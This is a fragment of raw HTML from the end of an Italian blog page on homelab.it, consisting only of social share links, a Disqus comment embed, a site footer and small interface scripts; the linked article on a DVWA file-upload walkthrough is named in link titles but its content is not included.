27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share DVWA File Upload – Soluzione Completa + Bonus XSS on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fwww.homelab.it%2findex.php%2f2016%2f03%2f02%2fdvwa-file-upload-soluzione-completa%2f&title=DVWA%20File%20Upload%20%e2%80%93%20Soluzione%20Completa%20%2b%20Bonus%20XSS"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share DVWA File Upload – Soluzione Completa + Bonus XSS on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fwww.homelab.it%2findex.php%2f2016%2f03%2f02%2fdvwa-file-upload-soluzione-completa%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share DVWA File Upload – Soluzione Completa + Bonus XSS on whatsapp" href="https://api.whatsapp.com/send?text=DVWA%20File%20Upload%20%e2%80%93%20Soluzione%20Completa%20%2b%20Bonus%20XSS%20-%20https%3a%2f%2fwww.homelab.it%2findex.php%2f2016%2f03%2f02%2fdvwa-file-upload-soluzione-completa%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share DVWA File Upload – Soluzione Completa + Bonus XSS on telegram" href="https://telegram.me/share/url?text=DVWA%20File%20Upload%20%e2%80%93%20Soluzione%20Completa%20%2b%20Bonus%20XSS&url=https%3a%2f%2fwww.homelab.it%2findex.php%2f2016%2f03%2f02%2fdvwa-file-upload-soluzione-completa%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer><div id=disqus_thread></div><script type=text/javascript>(function(){if(window.location.hostname=="localhost")return;var e=document.createElement("script"),t;e.type="text/javascript",e.async=!0,t="homelabit",e.src="//"+t+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com/ class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></article></main><footer class=footer><span>&copy; 2022 <a href=https://www.homelab.it/>HomeLab IT</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>